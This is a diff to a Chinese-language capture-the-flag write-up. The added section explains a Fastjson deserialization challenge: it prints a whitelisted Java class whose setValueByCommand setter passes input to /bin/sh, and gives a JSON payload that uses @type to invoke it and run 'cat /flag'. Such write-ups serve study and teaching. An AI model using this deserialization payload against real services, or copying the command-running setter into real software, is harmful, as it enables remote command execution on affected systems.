@@ -370,7 +370,46 @@ print(msg)
 
 ### 巧乐兹
 
-考察Fastjson反序列化，关键点在于可以通过修改序列化字符串中`@type`的类型来人为操控反序列化后得到对象的属性，同时配置中给了白名单`com.example.demo.`，其子类`MetricDTO`存在危险方法。我们只需要构造恶意序列化字符串即可读取flag
+考察Fastjson反序列化，关键点在于可以通过修改序列化字符串中`@type`的类型来人为操控反序列化后得到对象的属性，同时配置中给了白名单`com.example.demo.`，其子类`MetricDTO`存在危险方法，具体如下：
+
+```java
+public class MetricDTO {
+    private String key;
+    private String value;
+
+    public void setValue(String value) {
+        this.value = value;
+        Logger.info("set metric: '%s'='%s'", key, value);
+    }
+
+    public void setValueByCommand(String cmd) {
+        ProcessBuilder pb = new ProcessBuilder();
+        pb.command("/bin/sh", "-c", cmd);
+
+        Process process = pb.start();
+
+        InputStream in = process.getInputStream();
+        this.setValue(
+            new String(in.readAllBytes(), StandardCharsets.UTF_8)
+        );
+    }
+
+    public void setValueByProperty(String key) {
+        this.setValue(System.getProperty(key, ""));
+    }
+}
+```
+
+可以看到`setValueByCommand`函数中有明显的可利用点，根据JAVA的命名规则，我们只需传入一个包含参数名为`ValueByCommand`的包即可触发这一函数，进而调用`/bin/sh`执行shell命令，给出参考构造如下：
+
+```
+{
+  "@type": "com.example.demo.dto.MetricDTO",
+  "valueByCommand": "cat /flag 2>&1"
+}
+```
+
+然后请求`/api/v1/log`即可拿到flag
 
 ### 千度网盘
 
